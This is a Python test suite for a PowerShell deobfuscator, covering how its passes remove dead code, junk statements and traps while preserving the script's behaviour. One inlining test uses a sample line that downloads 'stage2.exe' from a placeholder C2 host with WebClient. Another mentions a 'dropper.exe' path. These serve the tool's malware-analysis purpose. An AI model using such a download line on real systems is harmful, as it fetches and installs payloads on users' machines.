from __future__ import annotations


from inspect import cleandoc

from test.lib.scripts.ps1.deobfuscation import TestPs1

from refinery.lib.scripts import set_child_list, tree_root, tree_version
from refinery.lib.scripts.ps1.analysis.cfg import build_control_flow_model
from refinery.lib.scripts.ps1.analysis.faults import build_fault_reach
from refinery.lib.scripts.ps1.deobfuscation import (
    Ps1ConstantInlining,
    Ps1ControlFlowDeflattening,
    Ps1DeadCodeElimination,
    Ps1DeadStoreElimination,
    Ps1FunctionEvaluator,
    Ps1JunkStatementRemoval,
    Ps1UnusedVariableRemoval,
)
from refinery.lib.scripts.ps1.deobfuscation.removal import Ps1RemovalPlan, Ps1RemovalPlans
from refinery.lib.scripts.ps1.model import (
    Expression,
    Ps1ExpressionStatement,
    Ps1ParenExpression,
    Ps1TrapStatement,
)
from refinery.lib.scripts.ps1.parser import Ps1Parser
from refinery.lib.scripts.ps1.synth import Ps1Synthesizer


def _faults(node):
    """
    The fault model over whatever tree *node* belongs to, which is what a plan is opened with
    outside a pass. A test builds one per plan rather than sharing: every plan here is reached
    before its own edit lands, so a model built at that point answers about the tree the verdict is
    about.
    """
    return build_fault_reach(build_control_flow_model(tree_root(node)))


class TestPs1RemovalPlan(TestPs1):

    @staticmethod
    def _script(source: str):
        return Ps1Parser(cleandoc(source)).parse()

    def test_a_batch_of_removals_advances_the_version_once(self):
        script = self._script("""
            'a'
            'b'
            'c'
        """)
        before = tree_version(script)
        plan = Ps1RemovalPlan(script, faults=_faults(script))
        for stmt in list(script.body)[:2]:
            plan.propose(stmt)
        self.assertTrue(plan.commit())
        self.assertEqual(len(script.body), 1)
        self.assertEqual(tree_version(script), before + 1)

    def test_survivors_ignores_the_veto(self):
        script = self._script("""
            try {
              'a'
              'b'
            } catch {
              Write-Host 'caught'
            }
        """)
        block = script.body[0].try_block
        plan = Ps1RemovalPlan(block, faults=_faults(block))
        for stmt in list(block.body):
            plan.propose(stmt)
        self.assertEqual(plan.survivors, [])
        plan.commit()
        self.assertEqual(len(block.body), 2)

    def test_a_rewrite_is_not_vetoed_where_a_removal_would_be(self):
        script = self._script("""
            try {
              'a'
            } catch {
              Write-Host 'caught'
            }
        """)
        block = script.body[0].try_block
        original = block.body[0]
        replacement = self._script("'b'").body[0]
        plan = Ps1RemovalPlan(block, faults=_faults(block))
        plan.propose(original, [replacement])
        self.assertTrue(plan.commit())
        self.assertIs(block.body[0], replacement)

    def test_a_plan_over_a_body_with_no_proposals_leaves_the_tree_alone(self):
        script = self._script("'a'")
        before = tree_version(script)
        self.assertFalse(Ps1RemovalPlan(script, faults=_faults(script)).commit())
        self.assertEqual(tree_version(script), before)

    def test_plans_group_by_the_body_each_statement_sits_in(self):
        script = self._script("""
            'a'
            function f {
              'b'
              'c'
            }
        """)
        definition = script.body[1]
        plans = Ps1RemovalPlans(_faults(script))
        self.assertTrue(plans.propose(script.body[0]))
        self.assertTrue(plans.propose(definition.body.body[0]))
        plans.commit()
        self.assertEqual(len(script.body), 1)
        self.assertEqual(len(definition.body.body), 1)

    def test_a_statement_in_no_list_is_declined(self):
        script = self._script('if ($x) { 1 }')
        plans = Ps1RemovalPlans(_faults(script))
        self.assertFalse(plans.propose(script.body[0].clauses[0][1]))

    def test_a_declined_proposal_gives_back_what_its_replacement_took(self):
        script = self._script("if ($x = 'a') { 1 }")
        condition = script.body[0].clauses[0][0]
        adopted = condition.value
        replacement = Ps1ExpressionStatement(expression=Ps1ParenExpression(expression=adopted))
        plans = Ps1RemovalPlans(_faults(script))
        self.assertFalse(plans.propose(condition, [replacement]))
        self.assertIs(adopted.parent, condition)

    def test_a_registered_replacement_takes_nothing_before_commit(self):
        script = self._script("'a'")
        original = script.body[0]
        adopted = original.expression
        replacement = Ps1ExpressionStatement(expression=Ps1ParenExpression(expression=adopted))
        plan = Ps1RemovalPlan(script, faults=_faults(script))
        plan.propose(original, [replacement])
        self.assertIs(adopted.parent, original)
        self.assertTrue(plan.commit())
        self.assertIs(script.body[0], replacement)
        self.assertIs(adopted.parent, replacement.expression)

    def test_a_replacement_the_caller_discarded_is_given_back_too(self):
        script = self._script("'a'")
        statement = script.body[0]
        adopted = statement.expression
        discarded = Ps1ExpressionStatement(expression=Ps1ParenExpression(expression=adopted))
        self.assertIs(adopted.parent, discarded.expression)
        plan = Ps1RemovalPlan(script, faults=_faults(script))
        plan.propose(statement, [])
        self.assertIs(adopted.parent, statement)

    def test_a_replacement_the_edit_could_not_land_takes_nothing_either(self):
        script = self._script("'a'")
        statement = script.body[0]
        adopted = statement.expression
        replacement = Ps1ExpressionStatement(expression=Ps1ParenExpression(expression=adopted))
        other = self._script("'x'")
        plan = Ps1RemovalPlan(other, faults=_faults(other))
        plan.propose(statement, [replacement])
        self.assertFalse(plan.commit())
        self.assertEqual(script.body, [statement])
        self.assertIs(adopted.parent, statement)

    def test_the_edit_that_landed_decides_alone_what_is_repaired(self):
        script = self._script("""
            'a'
            'b'
        """)
        # `missing` sits in a body this plan does not edit, so its splice is ignored and only
        # `landing` reaches the question.
        stranger = self._script("'x'")
        landing, missing = script.body[0], stranger.body[0]
        borrowed = missing.expression
        installed = Ps1ExpressionStatement(
            expression=Ps1ParenExpression(expression=landing.expression))
        stranded = Ps1ExpressionStatement(expression=Ps1ParenExpression(expression=borrowed))
        plan = Ps1RemovalPlan(script, faults=_faults(script))
        plan.propose(landing, [installed])
        plan.propose(missing, [stranded])
        self.assertTrue(plan.commit())
        self.assertIs(script.body[0], installed)
        self.assertIs(landing.expression.parent, installed.expression)
        self.assertEqual(stranger.body, [missing])
        self.assertIs(borrowed.parent, missing)

    def test_a_withdrawal_reaches_the_plan_that_holds_the_proposal(self):
        script = self._script("""
            'a'
            'b'
        """)
        statement = script.body[0]
        plans = Ps1RemovalPlans(_faults(script))
        plans.propose(statement)
        # Out of the tree and back, so a withdrawal that rediscovers the owning list finds nothing.
        set_child_list(script, 'body', [script.body[1]])
        plans.withdraw(statement)
        set_child_list(script, 'body', [statement, *script.body])
        self.assertEqual(plans.accepted, [])
        self.assertFalse(plans.commit())
        self.assertEqual(len(script.body), 2)

    def test_a_statement_filed_a_second_time_is_withdrawn_from_both(self):
        script = self._script("""
            'a'
            'b'
        """)
        statement = script.body[0]
        plans = Ps1RemovalPlans(_faults(script))
        plans.propose_in(script, statement)
        plans.propose_in(self._script("'x'"), statement)
        plans.withdraw(statement)
        self.assertEqual(plans.accepted, [])
        self.assertFalse(plans.commit())
        self.assertEqual(len(script.body), 2)

    def test_every_verdict_is_reached_before_the_first_edit_lands(self):
        script = self._script("""
            try {
              'junk'
            } catch {
              'more junk'
            }
        """)
        guard = script.body[0]
        protected = guard.try_block.body[0]
        handled = guard.catch_clauses[0].body.body[0]
        plans = Ps1RemovalPlans(_faults(script))
        plans.propose(handled)
        plans.propose(protected)
        accepted = plans.accepted
        self.assertEqual([id(statement) for statement in accepted], [id(handled)])
        self.assertTrue(plans.commit())
        self.assertEqual(guard.try_block.body, [protected])
        self.assertEqual(guard.catch_clauses[0].body.body, [])

    def test_a_withdrawn_proposal_is_left_where_it_stands(self):
        script = self._script("""
            'a'
            'b'
        """)
        keep, drop = script.body
        plan = Ps1RemovalPlan(script, faults=_faults(script))
        plan.propose(keep)
        plan.propose(drop)
        plan.withdraw(keep)
        self.assertEqual(plan.survivors, [keep])
        self.assertTrue(plan.commit())
        self.assertEqual(len(script.body), 1)
        self.assertIs(script.body[0], keep)

    def test_an_abandoned_batch_puts_back_what_its_replacements_adopted(self):
        script = self._script("'a'")
        original = script.body[0]
        adopted = original.expression
        replacement = Ps1ExpressionStatement(expression=Ps1ParenExpression(expression=adopted))
        self.assertIsNot(adopted.parent, original)
        plan = Ps1RemovalPlan(script, faults=_faults(script))
        plan.propose(original, [replacement])
        plan.abandon()
        self.assertFalse(plan.commit())
        self.assertEqual(script.body, [original])
        self.assertIs(adopted.parent, original)


class TestPs1IterativeRemoval(TestPs1):
    def test_a_junk_string_beside_an_anchor_is_kept_when_output_is_preserved(self):
        # `Write-Host done` writes nothing to the output stream, so it is no anchor: on
        # PowerShell 5.1 the console receives one item, `junk string`. Under the preserving model
        # that item survives however much it looks like padding, and repeating the whole pipeline
        # never wears it away.
        result = self._deobfuscate_iterative(
            "'junk string'\nWrite-Host done", preserve_bare_output=True)
        self.assertIn('junk string', result)
        self.assertIn('Write-Host done', result)

    def test_a_dead_branch_is_deleted(self):
        result = self._deobfuscate_iterative("if ($false) { 'dead' }\nWrite-Host ok")
        self.assertNotIn('dead', result)

    def test_an_inert_trap_is_deleted(self):
        self.assertEqual(self._deobfuscate_iterative('trap { continue }'), '')

    def test_an_empty_try_catch_is_deleted(self):
        self.assertEqual(self._deobfuscate_iterative('try {} catch {}'), '')

    def test_inlining_may_drop_the_assignment_it_carried_the_value_out_of(self):
        result = self._deobfuscate_iterative(cleandoc("""
            $u = 'http://c2.example.org/stage2.exe'
            (New-Object Net.WebClient).DownloadFile($u, 'out.exe')
        """))
        self.assertIn('c2.example.org', result)
        self.assertNotIn('$u', result)

    def test_an_expandable_string_keeps_the_parts_it_cannot_write_down(self):
        result = self._deobfuscate_iterative(
            'Write-Host "$env:APPDATA$($z = 1)\\dropper.exe"')
        self.assertIn('appdata', result.lower())


class TestPs1AScriptIsNeverPrunedToNothing(TestPs1):
    """
    A script that is nothing but a bare value still emits that value, so the root body may not be
    emptied. A `trap` left standing beside the value is machinery for the statements around it
    rather than one of them, and a body holding nothing else runs nothing at all.
    """

    def _content_beside_the_traps(self, source: str) -> str:
        script = Ps1Parser(self._deobfuscate_iterative(source)).parse()
        set_child_list(script, 'body', [
            statement for statement in script.body if not isinstance(statement, Ps1TrapStatement)
        ])
        return Ps1Synthesizer().convert(script)

    def test_the_only_value_a_script_emits_survives_an_injected_noise_trap(self):
        for trap in [
            'trap { break }',
            'trap { continue }',
            'trap { }',
            "trap [System.IO.IOException] { 'h' }",
            'trap [System.IO.IOException] { continue }',
        ]:
            with self.subTest(trap):
                self.assertEqual(self._content_beside_the_traps(F"{trap}\n'a'"), "'a'")


class TestPs1RemovalReportsWhatItDid(TestPs1):
    def _edit(self, source: str, transform):
        ast = Ps1Parser(cleandoc(source)).parse()
        before = tree_version(ast)
        pass_ = transform()
        pass_.visit(ast)
        return tree_version(ast) != before, pass_.changed

    def test_a_direct_field_rewrite_is_reported(self):
        moved, changed = self._edit(cleandoc("""
            $x = ($y = Start-Process a)
            Write-Host $x
        """), Ps1UnusedVariableRemoval)
        self.assertTrue(moved)
        self.assertEqual(moved, changed)

    def test_a_rewrite_inside_an_argument_is_reported(self):
        moved, changed = self._edit(
            'Write-Host ($y = Start-Process a)', Ps1UnusedVariableRemoval)
        self.assertTrue(moved)
        self.assertEqual(moved, changed)

    def test_a_pass_with_nothing_to_do_reports_nothing(self):
        moved, changed = self._edit("Write-Host 'ok'", Ps1UnusedVariableRemoval)
        self.assertFalse(moved)
        self.assertFalse(changed)

    def test_a_batch_that_is_one_edit_is_not_applied_in_halves(self):
        source = """
            try {
              $s = 0
              while ($s -ne 2) {
                switch ($s) {
                  0 { Write-Host one; $s = 1 }
                  1 { Write-Host two; $s = 2 }
                }
              }
            } catch { Write-Host 'caught' }
        """
        moved, changed = self._edit(source, Ps1ControlFlowDeflattening)
        self.assertFalse(moved)
        self.assertFalse(changed)
        self.assertIn('$s = 0', self._apply(cleandoc(source), Ps1ControlFlowDeflattening))

    def test_a_dispatcher_that_nothing_vetoes_still_dissolves(self):
        result = self._apply(cleandoc("""
            $s = 0
            while ($s -ne 2) {
              switch ($s) {
                0 { Write-Host one; $s = 1 }
                1 { Write-Host two; $s = 2 }
              }
            }
        """), Ps1ControlFlowDeflattening)
        self.assertNotIn('while', result)
        self.assertNotIn('$s', result)


class TestPs1RemovalDoesNotEmptyAProtectedTryBody(TestPs1):
    def test_junk_removal_keeps_a_protected_try_body(self):
        result = self._apply(cleandoc("""
            try {
              $Null = 1
            } catch {
              Write-Host 'caught'
            }
        """), Ps1JunkStatementRemoval)
        self.assertIn('$Null = 1', result)

    def test_dead_store_elimination_keeps_a_protected_try_body(self):
        result = self._apply(cleandoc("""
            try {
              $x = 1
              $x = 2
            } catch {
              Write-Host 'caught'
            }
            Write-Host $x
        """), Ps1DeadStoreElimination)
        self.assertIn('$x = 1', result)

    def test_unused_variable_removal_keeps_a_protected_try_body(self):
        result = self._apply(cleandoc("""
            Write-Host 'anchor'
            try {
              $unused = 1
            } catch {
              Write-Host 'caught'
            }
        """), Ps1UnusedVariableRemoval)
        self.assertIn('$unused = 1', result)

    def test_dead_code_elimination_keeps_a_protected_try_body(self):
        result = self._apply(cleandoc("""
            try {
              if ($false) { Write-Host 'dead' }
            } catch {
              Write-Host 'caught'
            }
        """), Ps1DeadCodeElimination)
        self.assertNotIn('try {}', result)
        self.assertIn('$false', result)

    def test_constant_inlining_keeps_a_protected_try_body(self):
        result = self._apply(cleandoc("""
            try {
              $n = 7
              Write-Host $n
            } catch {
              Write-Host 'err'
            }
        """), Ps1ConstantInlining)
        self.assertEqual(result, cleandoc("""
            try {
              $n = 7
              Write-Host 7
            } catch {
              Write-Host 'err'
            }
        """))

    def test_function_evaluation_keeps_a_protected_try_body(self):
        result = self._apply(cleandoc("""
            try {
              function D {
                Param([String]$s)
                return $s
              }
              Write-Host (D 'x')
            } catch {
              Write-Host 'err'
            }
        """), Ps1FunctionEvaluator)
        self.assertEqual(result, cleandoc("""
            try {
              function D {
                Param([String]$s)
                return $s
              }
              Write-Host ('x')
            } catch {
              Write-Host 'err'
            }
        """))

    def test_deflattening_keeps_a_protected_try_body(self):
        self._assertUnchanged(cleandoc("""
            try {
              $s = 0
              while ($s -ne -1) {
                switch ($s) {
                  0 {
                    $s = 1
                  }
                  1 {
                    Write-Host 'a'
                    $s = -1
                  }
                  default {
                    break
                  }
                }
              }
            } catch {
              Write-Host 'err'
            }
        """), Ps1ControlFlowDeflattening)

    def test_dead_code_elimination_still_prunes_a_try_body_that_stays_populated(self):
        result = self._deobfuscate_iterative(cleandoc("""
            try {
              Write-Host 'a'
              if ($false) { 'junk' }
              while ($false) { 'junk2' }
              Write-Host 'b'
            } catch {
              Write-Host 'caught'
            }
        """))
        self.assertNotIn('$False', result)
        self.assertIn("Write-Host 'a'", result)
        self.assertIn("Write-Host 'caught'", result)

    def test_a_dead_store_in_a_direct_field_still_becomes_a_discard(self):
        result = self._apply(cleandoc("""
            $x = ($y = Start-Process a)
            Write-Host 'k'
        """), Ps1UnusedVariableRemoval)
        self.assertNotIn('$y', result)
        self.assertIn('Start-Process a', result)

    def test_a_direct_field_keeps_holding_an_expression(self):
        for source in [
            "$x = ($y = Start-Process a)\nWrite-Host $x",
            'Write-Host ($y = Start-Process a)',
        ]:
            with self.subTest(source=source):
                ast = Ps1Parser(source).parse()
                Ps1UnusedVariableRemoval().visit(ast)
                for node in ast.walk():
                    if not isinstance(node, Ps1ParenExpression):
                        continue
                    if node.expression is None:
                        continue
                    self.assertIsInstance(node.expression, Expression)


class TestPs1DeadCodeEliminationDoesNotUnhookAHandler(TestPs1):
    def test_a_trap_inside_a_protected_try_body_is_kept(self):
        for body in ['trap { continue }', 'trap { }', 'trap { break }']:
            with self.subTest(body=body):
                result = self._apply(cleandoc(F"""
                    try {{
                      {body}
                      [int]'abc'
                      Write-Host 'x'
                    }} catch {{
                      Write-Host 'caught'
                    }}
                """), Ps1DeadCodeElimination)
                self.assertIn('trap', result)

    def test_a_trap_no_handler_protects_is_still_removed(self):
        result = self._apply(cleandoc("""
            trap { continue }
            Write-Host 'x'
        """), Ps1DeadCodeElimination)
        self.assertNotIn('trap', result)

    def test_a_trap_beside_an_empty_catch_is_still_removed(self):
        result = self._apply(cleandoc("""
            try {
              trap { continue }
              Write-Host 'x'
            } catch { }
        """), Ps1DeadCodeElimination)
        self.assertNotIn('trap', result)


class TestPs1DeadCodeEliminationKeepsATrapOverABlockThatMayRaise(TestPs1):
    """
    A `trap` runs when the block it is written in raises, and a bare value in its body goes to the
    output stream, so deleting one over a block that may raise silences an output the script made.
    Measured on 5.1: `trap { 'TRAP_OUTPUT' }` above `$Null = [Int]'abc'` and `'AFTER'` prints
    `TRAP_OUTPUT` and then `AFTER`, while the same `trap` above a bare `'keep'` prints only `keep`,
    because a string literal cannot raise and the handler never runs.

    Only a block that provably holds nothing able to raise lets the acting `trap` go. A command
    whose errors the model does not read is taken as able to raise, so the `trap` above one is kept
    — a benign command the analysis cannot clear costs a junk `trap` rather than a dropped output,
    which is the sound direction for the transpose.
    """

    def test_a_trap_whose_body_writes_is_kept_above_a_statement_that_raises(self):
        self._assertUnchanged(cleandoc("""
            trap {
              'TRAP_OUTPUT'
            }
            $Null = [Int]'abc'
            'AFTER'
        """), Ps1DeadCodeElimination)

    def test_the_same_trap_above_a_statement_that_provably_cannot_raise_is_removed(self):
        result = self._apply(cleandoc("""
            trap {
              'TRAP_OUTPUT'
            }
            'keep'
        """), Ps1DeadCodeElimination)
        self.assertEqual(result, "'keep'")

    def test_the_same_trap_above_a_command_the_model_cannot_clear_is_kept(self):
        self._assertUnchanged(cleandoc("""
            trap {
              'TRAP_OUTPUT'
            }
            Write-Host 'keep'
        """), Ps1DeadCodeElimination)


class TestPs1DeadCodeEliminationDoesNotCarryATrapOutOfItsBlock(TestPs1):
    """
    A `trap` guards the statement block it is written in and nothing around it, so a pass that
    resolves a construct into the statements of one of its blocks must leave a block that declares
    one alone. Measured on 5.1: a raise written after
    `if ($True) { trap { Write-Host 'TRAP_RAN' }; Write-Host 'inside' }` never runs that trap body,
    and the same trap hoisted to script scope runs it.
    """

    def test_a_trap_written_in_a_branch_the_pass_would_resolve_keeps_that_branch(self):
        self._assertUnchanged(cleandoc("""
            if ($True) {
              trap {
                Write-Host 'TRAP_RAN'
              }
              Write-Host 'inside'
            }
            Write-Host 'AFTER'
        """), Ps1DeadCodeElimination)

    def test_a_trap_written_in_a_finally_body_keeps_its_construct(self):
        self._assertUnchanged(cleandoc("""
            try {
              42
            } finally {
              trap {
                Write-Host 'TRAP_RAN'
              }
              Write-Host 'cleanup'
            }
            Write-Host 'AFTER'
        """), Ps1DeadCodeElimination)

    def test_the_same_branch_without_a_trap_is_resolved_into_the_statements_it_holds(self):
        result = self._apply(cleandoc("""
            if ($True) {
              Write-Host 'inside'
            }
            Write-Host 'AFTER'
        """), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc("""
            Write-Host 'inside'
            Write-Host 'AFTER'
        """))

    def test_the_same_construct_without_a_trap_is_resolved_into_the_blocks_it_holds(self):
        result = self._apply(cleandoc("""
            try {
              42
            } finally {
              Write-Host 'cleanup'
            }
            Write-Host 'AFTER'
        """), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc("""
            42
            Write-Host 'cleanup'
            Write-Host 'AFTER'
        """))


class TestPs1DeadCodeEliminationDoesNotCarryStatementsIntoAResumingBlock(TestPs1):
    """
    The mirror of the class above. A `trap { continue }` resumes the block it guards at the statement
    after the one that threw, so a raise inside a *nested* block abandons the rest of that block and
    carries on after it — measured on 5.1:
    `trap { continue }; if ($true) { throw 'e'; Write-Host 'tail' }; Write-Host 'next'` writes
    `next` alone.

    Resolving the `if` into the statements it holds would put them at the level the handler resumes
    into, so the raise would then resume at `tail` and the output would write a line the input never
    writes — a semantics defect, the deobfuscated script running code the original does not.
    `Ps1RemovalPlan._vetoed` refuses a replacement that carries a handler *out* of its block, and one
    spliced *into* a body a resuming trap guards where a spliced statement other than the last can
    raise. The `switch` fold splices its matched arm the same way and is refused the same way, and so
    are the `for` and `try` folds — the two constructs the graph keys to no node of their
    own, where the guard is read off a point inside them instead. A `trap { break }` re-raises and
    draws no resumption edge, so the identical construct under one is still resolved.
    """

    def test_a_branch_resolved_into_a_block_a_resuming_trap_guards_keeps_that_branch(self):
        self._assertUnchanged(cleandoc("""
            trap {
              continue
            }
            if ($True) {
              throw 'e'
              Write-Host 'tail'
            }
            Write-Host 'next'
        """), Ps1DeadCodeElimination)

    def test_a_switch_arm_resolved_into_a_block_a_resuming_trap_guards_keeps_that_switch(self):
        self._assertUnchanged(cleandoc("""
            trap {
              continue
            }
            switch (1) {
              1 {
                throw 'e'
                Write-Host 'tail'
              }
            }
            Write-Host 'next'
        """), Ps1DeadCodeElimination)

    def test_a_for_loop_resolved_into_a_block_a_resuming_trap_guards_keeps_that_loop(self):
        self._assertUnchanged(cleandoc("""
            trap {
              continue
            }
            for ($i = 0; $True; $i++) {
              throw 'e'
              Write-Host 'tail'
              break
            }
            Write-Host 'next'
        """), Ps1DeadCodeElimination)

    def test_a_try_resolved_into_a_block_a_resuming_trap_guards_keeps_that_try(self):
        self._assertUnchanged(cleandoc("""
            trap {
              continue
            }
            try {} catch {} finally {
              throw 'e'
              Write-Host 'tail'
            }
            Write-Host 'next'
        """), Ps1DeadCodeElimination)

    def test_a_branch_of_statements_that_cannot_raise_is_resolved_although_a_resuming_trap_guards_it(self):
        """
        The gate is precise, not "any splice of two into a resuming body": neither `'a'` nor `'b'`
        can raise, so no resumption target moves and the branch resolves. The now-unguarded resuming
        trap goes with it.
        """
        result = self._apply(cleandoc("""
            trap {
              continue
            }
            if ($True) {
              'a'
              'b'
            }
            Write-Host 'c'
        """), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc("""
            'a'
            'b'
            Write-Host 'c'
        """))

    def test_a_try_of_statements_that_cannot_raise_is_resolved_although_a_resuming_trap_guards_it(self):
        """
        The precision control for the construct the graph keys to no node of its own: the `finally`
        body cannot raise, so no resumption moves and the `try` resolves even under a resuming trap.
        """
        result = self._apply(cleandoc("""
            trap {
              continue
            }
            try {} catch {} finally {
              'a'
              'b'
            }
            Write-Host 'c'
        """), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc("""
            'a'
            'b'
            Write-Host 'c'
        """))

    def test_the_same_branch_under_a_trap_that_does_not_resume_is_resolved(self):
        """
        The floor under it, differing in the one word that decides the question: a `trap` that
        rethrows ends the script where the raise stands, so nothing after it runs at either level
        and moving the statements past it changes nothing. What is left behind is unreachable in
        the input too — this pass deletes such a statement only where no handler body encloses it.
        """
        result = self._apply(cleandoc("""
            trap {
              break
            }
            if ($True) {
              throw 'e'
              Write-Host 'tail'
            }
            Write-Host 'next'
        """), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc("""
            trap {
              break
            }
            throw 'e'
            Write-Host 'tail'
            Write-Host 'next'
        """))

    def test_the_same_switch_under_a_trap_that_does_not_resume_is_resolved(self):
        result = self._apply(cleandoc("""
            trap {
              break
            }
            switch (1) {
              1 {
                throw 'e'
                Write-Host 'tail'
              }
            }
            Write-Host 'next'
        """), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc("""
            trap {
              break
            }
            throw 'e'
            Write-Host 'tail'
            Write-Host 'next'
        """))

    def test_the_same_for_under_a_trap_that_does_not_resume_is_resolved(self):
        result = self._apply(cleandoc("""
            trap {
              break
            }
            for ($i = 0; $True; $i++) {
              throw 'e'
              Write-Host 'tail'
              break
            }
            Write-Host 'next'
        """), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc("""
            trap {
              break
            }
            $i = 0
            throw 'e'
            Write-Host 'tail'
            Write-Host 'next'
        """))

    def test_the_same_try_under_a_trap_that_does_not_resume_is_resolved(self):
        result = self._apply(cleandoc("""
            trap {
              break
            }
            try {} catch {} finally {
              throw 'e'
              Write-Host 'tail'
            }
            Write-Host 'next'
        """), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc("""
            trap {
              break
            }
            throw 'e'
            Write-Host 'tail'
        """))


class TestPs1ACallThatWritesNothingGoesOnlyWhereNothingObservesIt(TestPs1):
    """
    A static method declared `System.Void` puts no value on the output stream, so a statement that
    is nothing but such a call over a temporary the script cannot otherwise reach performs nothing a
    run can see, and the junk pass deletes it. Two questions stand around that one: a call that acts
    is impure whatever it returns and is never a candidate, and a call whose error a handler could
    receive is vetoed although it emits as little as any other.
    """

    _ANCHOR = "Write-Host 'anchor'"

    #: `[Array]::Clear` raises for a length that runs past the end of the array, so the only trace
    #: this statement can leave behind is the error a handler receives.
    _MAY_RAISE = "[Array]::Clear('abc'.ToCharArray(), 0, 99)"

    def test_a_void_static_call_over_a_temporary_is_deleted(self):
        for call in (
            "[Array]::Reverse('abc'.ToCharArray())",
            "[Array]::Sort('cba'.ToCharArray())",
            "[Array]::Clear('abc'.ToCharArray(), 0, 2)",
            "[Array]::Copy('ab'.ToCharArray(), 'cd'.ToCharArray(), 2)",
            "[Array]::ConstrainedCopy('ab'.ToCharArray(), 0, 'cd'.ToCharArray(), 0, 2)",
        ):
            with self.subTest(call):
                self.assertEqual(
                    self._apply(F'{call}\n{self._ANCHOR}', Ps1JunkStatementRemoval),
                    self._ANCHOR,
                )

    def test_a_static_call_that_produces_a_value_is_kept(self):
        for call in ('[Math]::Sqrt(36)', "[Array]::IndexOf('abc'.ToCharArray(), [Char]98)"):
            with self.subTest(call):
                self._assertUnchanged(F'{call}\n{self._ANCHOR}', Ps1JunkStatementRemoval)

    def test_a_void_static_call_that_writes_to_the_host_is_kept(self):
        for call in ("[Console]::WriteLine('x')", "[Console]::Write('x')"):
            with self.subTest(call):
                self._assertUnchanged(F'{call}\n{self._ANCHOR}', Ps1JunkStatementRemoval)

    def test_a_void_static_call_over_a_live_variable_is_kept(self):
        for call in (
            '[Array]::Reverse($x)',
            '[Array]::Reverse($x -as [array])',
            '[Array]::Reverse([int[]]$x)',
        ):
            with self.subTest(call):
                self._assertUnchanged(
                    F'$x = 1, 2, 3\n{call}\nWrite-Output $x', Ps1JunkStatementRemoval)

    def test_a_void_static_call_no_handler_can_observe_is_deleted(self):
        self.assertEqual(
            self._apply(F'{self._MAY_RAISE}\n{self._ANCHOR}', Ps1JunkStatementRemoval),
            self._ANCHOR,
        )

    def test_a_void_static_call_a_handler_can_observe_is_kept(self):
        self._assertUnchanged(cleandoc(F"""
            try {{
              {self._MAY_RAISE}
              Write-Host 'guarded'
            }} catch {{
              Write-Host 'caught'
            }}
        """), Ps1JunkStatementRemoval)

    def test_a_void_static_call_in_a_function_a_handler_calls_is_kept(self):
        self._assertUnchanged(cleandoc(F"""
            function f {{
              {self._MAY_RAISE}
            }}
            try {{
              f
            }} catch {{
              Write-Host 'caught'
            }}
        """), Ps1JunkStatementRemoval)

    def test_the_same_function_no_handler_calls_is_deleted(self):
        self.assertEqual(self._apply(cleandoc(F"""
            function f {{
              {self._MAY_RAISE}
            }}
            f
            {self._ANCHOR}
        """), Ps1JunkStatementRemoval), self._ANCHOR)
